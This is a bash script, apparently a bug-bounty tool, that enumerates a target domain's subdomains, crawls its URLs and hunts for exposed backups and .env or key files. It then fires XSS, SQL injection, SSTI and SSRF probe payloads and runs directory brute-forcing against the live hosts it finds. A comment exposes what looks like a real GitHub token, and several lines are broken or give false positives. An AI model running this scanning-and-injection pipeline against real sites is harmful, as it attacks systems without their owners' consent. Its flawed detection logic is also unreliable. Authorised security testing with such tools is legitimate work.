#!/bin/bash


target=$(cat output.txt);
echo ""
echo "target is $target"



echo "finding from assetfinder \n"
assetfinder --subs-only $target | grep -v '\*' | rev | cut -d. -f1-3 | rev | sort -u | tee 1st-$target-subs.txt > /dev/null;

echo "finding from subfinder \n"
subfinder -d $target -silent | grep -v '\*' | rev | cut -d. -f1-3 | rev | sort -u | tee -a 1st-$target-subs.txt > /dev/null;
#amass
#amass enum -norecursive -noalts -passive -d $target -config /mnt/c/Users/nix/Desktop/Amass_Config.ini | grep -v '\*' | rev | cut -d. -f1-3 | rev | sort -u | tee -a 1st-$target-subs.txt > /dev/null
#Findomain
echo "finding from finddomain-linux \n"
#findomain-linux -t $target -q | grep -v "\*" | rev | cut -d "." -f1-3 | rev | sort -u >> 1st-$target-subs.txt;
#Second Level - Sub Enum...
cat 1st-$target-subs.txt  | sort -u >> part-1.txt
rm 1st-$target-subs.txt 
#securitytrails
#curl -s "https://api.securitytrails.com/v1/domain/$target/subdomains" --header "Accept: application/json" --header "apikey: <API_KEY>" | jq -r '.subdomains' | grep -v '\]\|\['| sed 's/\"//g'| sed -r 's/\,//g' | sed -z 's/\n/.'$target'\n/g' | awk '{print $1}' | sort -u > $target-sectrails_domains.txt
#CRT.SH
echo "finding from crt  \n"
curl -s "https://crt.sh/?q=%25.$target&output=json"| jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$target" > $target-crt_domains.txt;

#WAY-ARCHIVE
echo "finding from web-archive  \n"
curl -s "http://web.archive.org/cdx/search/cdx?url=*.$target/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' |sort -u > $target-warchive_domains.txt;

#DNS-BUFFER
echo "finding from Dns-buffer  \n"
curl -s "https://dns.bufferover.run/dns?q=.$target" | jq -r .FDNS_A[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$target" | sort -u > $target-dnsbuffer_domains.txt;
curl -s "https://dns.bufferover.run/dns?q=.$target" | jq -r .RDNS[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$target" | sort -u >> $target-dnsbuffer_domains.txt;
curl -s "https://tls.bufferover.run/dns?q=.$target" | jq -r .Results 2>/dev/null | cut -d ',' -f3 |grep -o "\w.*$target"| sort -u >> $target-dnsbuffer_domains.txt;

#Threatcrowd
echo "finding from Threat-crowd  \n"
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$target"|jq -r '.subdomains' 2>/dev/null |grep -o "\w.*$target" > $target-threatcrowd_domains.txt;

#HackerTarget
echo "finding from hacker-target  \n"
curl -s "https://api.hackertarget.com/hostsearch/?q=$target"|grep -o "\w.*$target"> $target-hackertarget_domains.txt;

#Certspotter
echo "finding from cert-spotter  \n"
curl -s "https://certspotter.com/api/v0/certs?domain=$target" | jq -r '.[].dns_names[]' 2>/dev/null | grep -o "\w.*$target" | sort -u > $target-certspotter_domains.txt;

#anubisdb
echo "finding from anubis  \n"
curl -s "https://jldc.me/anubis/subdomains/$target" | jq -r '.' 2>/dev/null | grep -o "\w.*$target" > $target-anubisdb_domains.txt;
#virustotal
echo "finding from virustotal  \n"
curl -s "https://www.virustotal.com/ui/domains/$target/subdomains?limit=40"|jq -r '.' 2>/dev/null |grep id|grep -o "\w.*$target"|cut -d '"' -f3|egrep -v " " > $target-virustotal_domains.txt;
#alienvault
echo "finding from alien-vault  \n"
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$target/passive_dns"|jq '.passive_dns[].hostname' 2>/dev/null |grep -o "\w.*$target"|sort -u > $target-alienvault_domains.txt;
#urlscan
echo "finding from urlscan  \n"
curl -s "https://urlscan.io/api/v1/search/?q=domain:$target"|jq '.results[].page.domain' 2>/dev/null |grep -o "\w.*$target"|sort -u > $target-urlscan_domains.txt;

#threatminer
echo "finding from theat-miner  \n"
curl -s "https://api.threatminer.org/v2/domain.php?q=$target&rt=5" | jq -r '.results[]' 2>/dev/null |grep -o "\w.*$1"|sort -u > $target-threatminer_domains.txt;
#entrust
echo "finding from entrust  \n"
curl -s "https://ctsearch.entrust.com/api/v1/certificates?fields=subjectDN&domain=$target&includeExpired=false&exactMatch=false&limit=5000" | jq -r '.[].subjectDN' 2>/dev/null |sed 's/cn=//g'|grep -o "\w.*$target"|sort -u > $target-entrust_domains.txt;
#riddler
echo "finding from riddler-1  \n"
curl -s "https://riddler.io/search/exportcsv?q=pld:$target"| grep -o "\w.*$target"|awk -F, '{print $6}'|sort -u > $target-riddler_domains.txt;
echo "finding from riddler-2  \n"
curl -s "https://riddler.io/search/exportcsv?q=pld:$target"|cut -d "," -f6|grep $target|sort -u >> $target-riddler_domains.txt;
#dnsdumpster
echo "finding from Dns-dumpster-2  \n"
cmdtoken=$(curl -ILs https://dnsdumpster.com | grep csrftoken | cut -d " " -f2 | cut -d "=" -f2 | tr -d ";");
curl -s --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$cmdtoken&targetip=$target" --cookie "csrftoken=$cmdtoken; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com > dnsdumpster.html
cat dnsdumpster.html|grep "https://api.hackertarget.com/httpheaders"|grep -o "\w.*$target"|cut -d "/" -f7|sort -u > $target-dnsdumper_domains.txt
rm dnsdumpster.html
#rapiddns 
echo "finding from rappid-dns  \n"
curl -s "https://rapiddns.io/subdomain/$target?full=1#result" | grep -oaEi "https?://[^\"\\'> ]+" | grep $target | cut -d "/" -f3 | sort -u | grep -v "\*" > $target-rapiddns_domains.txt;
#choas
echo "finding from chaos  \n"
org=$(echo $target | cut -d. -f1)
curl -sSfL "https://chaos-data.projectdiscovery.io/index.json" | grep "URL" | sed 's/"URL": "//;s/",//' | grep "$org" | while read host do;do curl -sSfL "$host" > /dev/null;done && for i in `ls -1 | grep .zip$`; do unzip $i > /dev/null; done && rm -f *.zip && cat $org*.txt | grep -v "\*" > $target-choas_domains.txt;
#GitHub Subdomains
echo "finding from github  \n"
#github-subdomains.py -t "token" -d $target | grep -v "\*" 2>/dev/null > $target-github_domains.txt;
cat *_domains.txt part-1.txt | grep -oE "[a-zA-Z0-9._-]+\.$target" | anew | sort -u >> subdomains.txt;
rm *_domains.txt part-1.txt
echo "findings links for manual testing of various attacks \n"
echo "finding url from waybackurls"
cat subdomains.txt  | httpx --status-code  --silent | grep "200" | awk '{print $1}' | tee -a live.txt
cat live.txt | grep -oE "[a-zA-Z0-9._-]+\.$target" | waybackurls |sort -u | tee -a waybackurls.txt
echo "finding url from gauplus"
cat live.txt  |  grep -oE "[a-zA-Z0-9._-]+\.$target" | sort -u | gauplus --random-agent --subs -t 5000 | sort -u | tee -a  waybackurls.txt
cat waybackurls.txt | sort -u  | cut -d "?" -f 1 | cut -d "=" -f 1 > filtered.txt
echo "finding url from github"
#python3 /usr/bin/github-endpoints.py -d $target -t 29ac37f8ec9e04c4f9a368314673dc26c74bdf9f >> githubs.txt
echo "finding url from hackrawler"
for i in $(cat live.txt |  grep -oE "[a-zA-Z0-9._-]+\.$target" | anew | httpx --silent );do echo $i | hakrawler -u | tee -a hakraw.txt;done;
#echo "finding url from gospider"
for i in $(cat live.txt |  grep -oE "[a-zA-Z0-9._-]+\.$target" | anew | httpx --silent );do gospider -t 10 -c 5 -s $i  >> gosp.txt;done;   
#check with httpx wheather any backups or similar files are there or not.
grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" filtered.txt | sort -u  > leaks.txt   

cat waybackurls.txt  hakraw.txt  | sort -u >> all-links.txt
rm waybackurls.txt  hakraw.txt 

echo "cleaning urls "
cat all-links.txt | egrep -iv -e "\.(png|jpg|jpeg|gif|pdf|svg|css|eot|woff|ttf|otf)"  -e "/svg" >> cleaned_urls.txt;
rm all-links.txt
cat cleaned_urls.txt | grep -E '\?.*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])' >> lfi1.txt
cat cleaned_urls.txt | gf ssrf >> lfi2.txt
cat lfi2.txt lfi1.txt  | anew | sort -u  >> lfi-rfi-ssrf.txt
rm lfi2.txt lfi1.txt
#different language urls
cat cleaned_urls.txt |  grep -P "\w+\.js(\?|$)" >> all-js.txt
cat cleaned_urls.txt |  grep -P "\w+\.php(\?|$)" >> all-php.txt
cat cleaned_urls.txt |  grep -P "\w+\.jsp(\?|$)" >> all-jsp.txt
cat cleaned_urls.txt |  grep -P "\w+\.aspx(\?|$)" >> all-aspx.txt
    echo "extracting url which can be vulnerable to xss"
    grep -iaE "\?q=|\?s=|\?search=|\?id=|\?lang=|\?keyword=|\?query=|\?page=|?keywords=|\?year=|\?view=|\?email=|\?type=|\?name=|\?p=|\?month=|\?imagine=|\?list_type=|\?url=|\?terms=|\?categoryid=|\?key=|\?l=|\?begindate=|\?enddate="   cleaned_urls.txt >> xss1.txt;
    cat cleaned_urls.txt | gf xss  | sort -u >> xss2.txt
    cat cleaned_urls.txt | grep "?" |  sort -u >> xss3.txt
    cat xss1.txt xss2.txt xss3.txt  | qsreplace '0' | sort -u >> xss.txt
    cat xss.txt | grep "?" | qsreplace '"><script>alert(4)</script>' | sort -u  >> xss-par.txt 2>/dev/null
    echo "payload added to the urls"
    rm xss1.txt xss2.txt
	sleep 3s ;
	echo "---------------------------------------------------------------------------------------------- "
    echo "extracted values are been checked for xss \n"

    cat  xss-par.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "alert(4)" && echo "vulnerable " $host"\n"  | sort -u | tee -a xss-manual.txt ;done;
    #echo "checking xss through dalfox"
    #cat xss.txt | httpx --silent --status-code  | grep "200" | awk '{print $1}'  | qsreplace '1'  | anew  | dalfox pipe -o dalfox-xss.txt;
    rm  xss-par.txt xss3.txt
    echo "finding sql injection"
grep -iaE "\?id=|\?page=|\?dir=|\?search=|\?category=|\?file=|\?class=|\?url=|\?news=|\?item=|\?menu=|\?lang=|\?name=|\?ref=|\?title=|\?view=|\?topic=|\?thread=|\?type=|\?date=|\?form=|\?join=|\?main=|\?nav=|\?region=" cleaned_urls.txt >> sqli1.txt;
cat cleaned_urls.txt | grep "=" | sort -u  >> sqli2.txt;
cat sqli1.txt sqli2.txt | qsreplace "'" | sort -u >> sql.txt
rm sqli1.txt sqli2.txt
for i in $(cat sql.txt ); do curl -s $i | grep -iaEqs "Error|\error|\line|\syntax|\Warning|\use+near|\use near|\SQL syntax|\Query failed:" && echo "vulnerable url is " "$i\n"  | tee -a  result.txt ;done;
#for i in $(cat sqli.txt ); do curl -s $i| grep -iaE "line|\syntax" && echo "vulnerable url is " "$i\n" >> result1.txt ;done;
#for i in $(cat sqli.txt ); do curl -s $i| grep -iaE "Warning|\use+near" && echo "vulnerable url is" "$i\n" >> result2.txt ;done;
cat result.txt >> final_sql.txt
rm result1.txt result.txt result2.txt
echo "running cors scanner"
    cat subdomains.txt | httpx --silent | xargs -P 50 -I@ sh -c "python3 ~/Desktop/CORScanner/cors_scan.py -v -u '@' | tee -a cors_scanner_result.txt"
    echo "cors scanner done \n"
    echo "checking ssti"
    cat cleaned_urls.txt | grep '=' | sort -u >> ssti.txt
    cat ssti.txt | qsreplace '${{3*3}}' | sort -u >> ssti-with-payload.txt 
    for i in $(cat ssti-with-payload.txt );do curl -s $i | grep  -iaEqs '9' && echo $i "might be vulenrable to ssti" | tee -a final-ssti.txt;done;
    rm ssti.txt
    echo "checking ssrf"
    cat cleaned_urls.txt | grep '=' | sort -u >> ssrf1.txt
    cat ssrf1.txt  | grep "?" | qsreplace "http://localhost" >> ssrf-ans.txt
    for i in $(cat ssrf-ans.txt);do curl -s $i | grep "http://localhost" && echo $i " may be vulnerable to ssrf" | tee -a ssrf-vuln.txt;done;
    rm ssrf.txt lfi-rfi-ssrf.txt ssrf-ans.txt
    cat live.txt | httpx --silent --threads 10 --status-code | egrep -v "400" | awk '{print $1}' | xargs -I@ sh -c 'ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u @/FUZZ -c -fc 501,502,503 -D -e php,zip,rar,tar,bkp,bak,sql,sql.gz,html,js,csv,log,cgi,swp -ac | tee -a directoty.txt'
    unoconv -f pdf subdomains.txt directory.txt cors_scanner_result.txt ssrf-vuln.txt final-ssti.txt final_sql.txt xss-manual.txt


